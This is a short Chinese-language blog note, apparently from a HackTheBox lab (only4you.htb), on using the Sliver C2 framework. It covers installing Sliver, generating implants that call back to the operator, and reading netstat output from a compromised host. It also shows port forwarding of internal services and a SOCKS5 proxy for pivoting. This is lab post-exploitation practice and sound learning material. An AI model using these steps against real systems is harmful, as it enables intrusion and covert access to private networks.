最近听说了个[Sliver C2](https://github.com/BishopFox/sliver)好像是对标CS的？


## Install

安装很简单： 
> `curl https://sliver.sh/install|sudo bash` and then run `sliver`

- memo：这种方式安装即为[Multiplayer Mode](https://github.com/BishopFox/sliver/wiki/Multiplayer-Mode)

		The easiest way to setup a server for multiplayer is to use the Linux install script which will configure the server as a systemd service.


## [Implants: Beacon vs. Session](https://github.com/BishopFox/sliver/wiki/Getting-Started#implants-beacon-vs-session)

`sliver > generate [beacon] --mtls <yourIP> --os linux [--save 绝对路径]`

- 默认保存在当前工作目录——即打开sliver时的目录
- 可用 `implants` 命令进行管理（但是其实源文件还是要自己手动删！） 
- 端口转发仅支持会话模式
    - 尝试beacon模式开临时会话——临时会话关掉之后配置的端口转发也失效


## netstat注意点

Sliver的 `netstat` 命令要显示全还挺麻烦的……如果不是之前知道开放了3000、8001等本地端口的话，估计就不会注意到了。对比带选项和不带选项：
```bash
sliver (SMILING_WET-BAR) > netstat -4 -6 -l -n -T -u

 Protocol   Local Address     Foreign Address   State         PID/Program Name 
========== ================= ================= ============= ==================
 udp        127.0.0.1:48897   127.0.0.53:53     ESTABLISHED   0/               
 udp        127.0.0.53:53     0.0.0.0:0                       0/               
 udp        0.0.0.0:68        0.0.0.0:0                       0/               
 tcp        127.0.0.1:3306    0.0.0.0:0         LISTEN        0/               
 tcp        0.0.0.0:80        0.0.0.0:0         LISTEN        1049/nginx       
 tcp        127.0.0.53:53     0.0.0.0:0         LISTEN        0/               
 tcp        0.0.0.0:22        0.0.0.0:0         LISTEN        0/               
 tcp        127.0.0.1:3000    0.0.0.0:0         LISTEN        0/               
 tcp        127.0.0.1:8001    0.0.0.0:0         LISTEN        0/               
 tcp        127.0.0.1:33060   0.0.0.0:0         LISTEN        0/               
 tcp6       127.0.0.1:7474    :::0              LISTEN        0/               
 tcp6       :::22             :::0              LISTEN        0/               
 tcp6       127.0.0.1:7687    :::0              LISTEN        0/


sliver (SMILING_WET-BAR) > netstat 

 Protocol   Local Address         Foreign Address    State         PID/Program Name     
========== ===================== ================== ============= ======================
 tcp        only4you.htb.:48422   10.xx.xx.xx:4444   ESTABLISHED   5111/python3         
 tcp        only4you.htb.:44230   10.xx.xx.xx:4444   CLOSE_WAIT    1438/python3         
 tcp        only4you.htb.:32794   10.xx.xx.xx:4444   CLOSE_WAIT    1250/python3         
 tcp        localhost:3000        localhost:41604    ESTABLISHED   0/                   
 tcp        localhost:3000        localhost:41616    ESTABLISHED   0/                   
 tcp        only4you.htb.:59626   10.xx.xx.xx:4444   CLOSE_WAIT    2215/python3         
 tcp        only4you.htb.:39926   dns.google.:53     SYN_SENT      0/                   
 tcp        localhost:3000        localhost:41624    ESTABLISHED   0/
```

## Port Forwarding

```bash
sliver (SMILING_WET-BAR) > portfwd add -b 10.xx.xx.xx:7474 -r 127.0.0.1:7474

[*] Port forwarding 10.xx.xx.xx:7474 -> 127.0.0.1:7474


sliver (SMILING_WET-BAR) > portfwd 

 ID   Session ID                             Bind Address       Remote Address 
==== ====================================== ================== ================
  1   bd9e189d-515d-43a8-913d-8bf558991ee8   10.xx.xx.xx:3000   127.0.0.1:3000 
  2   bd9e189d-515d-43a8-913d-8bf558991ee8   10.xx.xx.xx:8001   127.0.0.1:8001 
  3   bd9e189d-515d-43a8-913d-8bf558991ee8   10.xx.xx.xx:7474   127.0.0.1:7474
```

## socks5 proxy

也可以 `socks start` 开启socks5代理。然后在浏览器配置代理就好了